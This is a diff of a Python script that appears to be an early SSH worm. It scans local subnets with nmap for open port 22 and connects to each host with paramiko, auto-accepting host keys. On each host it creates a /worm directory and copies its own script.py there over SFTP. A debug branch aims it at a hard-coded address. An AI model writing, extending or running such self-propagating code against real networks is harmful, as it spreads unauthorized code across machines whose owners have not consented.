@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
+import os
+
 import nmap
 import paramiko
 import psutil
+
 
 ###############
 #### network
@@ -10,6 +13,7 @@ import psutil
 
 def bin2dec(mask: str):
     return sum(bin(int(x)).count('1') for x in mask.split('.'))
+
 
 # 'nmap -oX - -p 22 -sV 172.20.144.1/20'
 def find_hosts(addr: str):
@@ -37,7 +41,7 @@ def get_addr_mask(addrs: dict):
 ###############
 
 def connect_remote(addr: str):
-    cmd_to_execute = 'pwd'
+    cmd_to_execute = 'mkdir -p /worm'
 
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -46,22 +50,36 @@ def connect_remote(addr: str):
     ssh_stdout.channel.set_combine_stderr(True)
 
     output = ssh_stdout.readlines()
-    print(output)
+    print(f'=== res={output} ===')
+
+    send_load(ssh)
 
     ssh.close()
 
 
+def send_load(ssh: paramiko.SSHClient):
+    path = os.path.dirname(os.path.realpath(__file__))
+    sftp = ssh.open_sftp()
+    print(f'=== sending to {path} ===')
+    sftp.put(f'{path}/script.py', '/worm/script.py')
+    print('=== load sent ===')
+    sftp.close()
+
+
 if __name__ == '__main__':
-    net_info = psutil.net_if_addrs()
-    print(net_info)
-    addrs = [addr for addr in list(get_addr_mask(net_info)) if int(addr.split('/')[1]) > 20]
-    # addrs = [addr for addr in get_addr_mask(net_info)]
-    print(addrs)
-    hosts = [list(find_hosts(addr)) for addr in addrs]
-    hosts = [item for sublist in hosts for item in sublist]
+    DEBUG = True
+    if not DEBUG:
+        net_info = psutil.net_if_addrs()
+        print(net_info)
+        addrs = [addr for addr in list(get_addr_mask(net_info)) if int(addr.split('/')[1]) > 20]
+        print(addrs)
+        hosts = [list(find_hosts(addr)) for addr in addrs]
+        hosts = [item for sublist in hosts for item in sublist]
+    else:
+        hosts = [("10.0.0.12", "open")]
 
     for host in hosts:
         print(f'==== testing {host} ====')
         if host[1] == 'open':
             connect_remote(host[0])
-    print('done 8)')
+    print('==== done 8) ====')
